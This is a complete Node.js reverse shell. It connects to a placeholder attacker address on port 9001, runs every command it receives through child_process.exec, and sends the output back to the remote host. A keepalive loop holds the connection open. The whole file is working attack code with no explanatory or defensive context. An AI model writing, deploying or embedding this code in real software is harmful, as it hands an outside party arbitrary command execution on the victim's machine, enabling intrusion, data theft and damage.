// windows (Linux/macOS)
const net = require('net');
const { exec } = require('child_process');

const LHOST = "IP_ADDRESS";
const LPORT = 9001;

function main() {
    const tcpClient = new net.Socket();

    tcpClient.connect(LPORT, LHOST, () => {
        tcpClient.setNoDelay(true);
    });

    tcpClient.setEncoding('utf8');

    let code = "";
    const bufferSize = 1024;

    tcpClient.on('data', (data) => {
        code += data;

        if (code.includes('\n')) {
            const commands = code.split('\n');
            // The last element may be incomplete command, keep it in code
            code = commands.pop();

            commands.forEach(cmd => {
                if (cmd.trim()) {
                    exec(cmd.trim(), (error, stdout, stderr) => {
                        let output = '';
                        if (error) {
                            output = stderr || error.message;
                        } else {
                            output = stdout;
                        }
                        tcpClient.write(output + "\n");
                    });
                }
            });
        }
    });

    tcpClient.on('error', (err) => {
        // Connection lost or other error
        tcpClient.destroy();
    });

    tcpClient.on('close', () => {
        // Connection closed
    });

    // Periodically check connection by sending empty data
    const interval = setInterval(() => {
        if (tcpClient.destroyed) {
            clearInterval(interval);
            return;
        }
        try {
            tcpClient.write('');
        } catch (e) {
            tcpClient.destroy();
            clearInterval(interval);
        }
    }, 100);
}

main();